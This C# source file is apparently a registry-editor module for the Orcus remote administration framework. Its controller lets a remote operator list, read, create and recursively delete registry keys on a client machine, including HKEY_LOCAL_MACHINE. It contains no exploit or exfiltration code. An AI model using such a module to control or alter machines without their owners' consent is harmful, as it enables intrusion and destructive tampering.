using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using Orcus.Modules.Api;
using Orcus.Modules.Api.Parameters;
using Orcus.Modules.Api.Routing;
using RegistryEditor.Shared.Dtos;

namespace RegistryEditor.Client.Controllers
{
    public class RegistryEditorController : OrcusController
    {
        [OrcusGet("subKeys")]
        public IActionResult GetSubKeys([FromQuery] string path)
        {
            var (registryHive, relativePath) = RegistryHelper.UnpackPath(path);

            using (var regKey = RegistryHelper.OpenRegistry(registryHive)
                .OpenSubKey(relativePath ?? string.Empty, RegistryKeyPermissionCheck.ReadSubTree))
            {
                var subKeys = new List<RegistryKeyDto>();
                foreach (var subKeyName in regKey.GetSubKeyNames())
                {
                    bool hasSubKeys;
                    try
                    {
                        using (var subKey = regKey.OpenSubKey(subKeyName, RegistryKeyPermissionCheck.ReadSubTree))
                        {
                            hasSubKeys = subKey.SubKeyCount > 0;
                        }
                    }
                    catch (Exception)
                    {
                        hasSubKeys = true;
                    }

                    subKeys.Add(new RegistryKeyDto {Name = subKeyName, HasSubKeys = hasSubKeys});
                }

                return Ok(subKeys);
            }
        }

        [OrcusDelete("subKeys")]
        public IActionResult DeleteSubKey([FromQuery] string path)
        {
            var (registryHive, relativePath) = RegistryHelper.UnpackPath(path);

            using (var regKey = RegistryHelper.OpenRegistry(registryHive))
            {
                regKey.DeleteSubKeyTree(relativePath, true);
                return Ok();
            }
        }

        [OrcusPost("subKeys")]
        public IActionResult CreateSubKey([FromBody] string path)
        {
            var (registryHive, relativePath) = RegistryHelper.UnpackPath(path);

            using (var regKey = RegistryHelper.OpenRegistry(registryHive))
            {
                regKey.CreateSubKey(relativePath).Dispose();
                return Ok();
            }
        }

        [OrcusGet("subKeys/values")]
        public IActionResult GetSubKeyValues([FromBody] string path)
        {
            var (registryHive, relativePath) = RegistryHelper.UnpackPath(path);

            using (var regKey = RegistryHelper.OpenRegistry(registryHive).OpenSubKey(relativePath, RegistryKeyPermissionCheck.ReadSubTree))
            {
                var result = new List<RegistryValue>();
                foreach (var valueName in regKey.GetValueNames())
                {
                    var kind = regKey.GetValueKind(valueName);
                    switch (kind)
                    {
                        case RegistryValueKind.String:
                            result.Add(new StringRegistryValue {Name = valueName, Value = (string) regKey.GetValue(valueName, string.Empty)});
                            break;
                        case RegistryValueKind.ExpandString:
                            result.Add(
                                new ExpandableStringRegistryValue {Name = valueName, Value = (string) regKey.GetValue(valueName, string.Empty)});
                            break;
                        case RegistryValueKind.Binary:
                            result.Add(new BinaryRegistryValue {Name = valueName, Value = (byte[]) regKey.GetValue(valueName, new byte[0])});
                            break;
                        case RegistryValueKind.DWord:
                            result.Add(new DWordRegistryValue {Name = valueName, Value = (uint) (int) regKey.GetValue(valueName, 0)});
                            break;
                        case RegistryValueKind.MultiString:
                            result.Add(new MultiStringRegistryValue {Name = valueName, Value = (string[]) regKey.GetValue(valueName, new string[0])});
                            break;
                        case RegistryValueKind.QWord:
                            result.Add(new QWordRegistryValue {Name = valueName, Value = (ulong) (long) regKey.GetValue(valueName, 0L)});
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
                    }
                }

                return Ok(result);
            }
        }
    }

    public static class RegistryHelper
    {
        public static RegistryKey OpenRegistry(RegistryHive registryHive)
        {
            switch (registryHive)
            {
                case RegistryHive.ClassesRoot:
                    return Registry.ClassesRoot;
                case RegistryHive.CurrentUser:
                    return Registry.CurrentUser;
                case RegistryHive.LocalMachine:
                    return Registry.LocalMachine;
                case RegistryHive.Users:
                    return Registry.Users;
                case RegistryHive.CurrentConfig:
                    return Registry.CurrentConfig;
                default:
                    throw new ArgumentOutOfRangeException(nameof(registryHive), registryHive, null);
            }
        }

        public static (RegistryHive, string) UnpackPath(string path)
        {
            var split = path.Split(new[] { '\\' }, 2);
            return (ConvertToRegistryHive(split[0]), split.Skip(1).FirstOrDefault());
        }

        public static RegistryHive ConvertToRegistryHive(string hiveName)
        {
            switch (hiveName)
            {
                case var name when name.Equals("HKEY_CLASSES_ROOT", StringComparison.OrdinalIgnoreCase):
                    return RegistryHive.ClassesRoot;
                case var name when name.Equals("HKEY_CURRENT_USER", StringComparison.OrdinalIgnoreCase):
                    return RegistryHive.CurrentUser;
                case var name when name.Equals("HKEY_LOCAL_MACHINE", StringComparison.OrdinalIgnoreCase):
                    return RegistryHive.LocalMachine;
                case var name when name.Equals("HKEY_USERS", StringComparison.OrdinalIgnoreCase):
                    return RegistryHive.Users;
                case var name when name.Equals("HKEY_CURRENT_CONFIG", StringComparison.OrdinalIgnoreCase):
                    return RegistryHive.CurrentConfig;
            }

            throw new ArgumentException("Invalid registry hive: " + hiveName, nameof(hiveName));
        }

        public static string ToPath(this RegistryHive hive)
        {
            switch (hive)
            {
                case RegistryHive.ClassesRoot:
                    return "HKEY_CLASSES_ROOT";
                case RegistryHive.CurrentUser:
                    return "HKEY_CURRENT_USER";
                case RegistryHive.LocalMachine:
                    return "HKEY_LOCAL_MACHINE";
                case RegistryHive.Users:
                    return "HKEY_USERS";
                case RegistryHive.CurrentConfig:
                    return "HKEY_CURRENT_CONFIG";
                default:
                    throw new ArgumentOutOfRangeException(nameof(hive), hive, null);
            }
        }
    }
}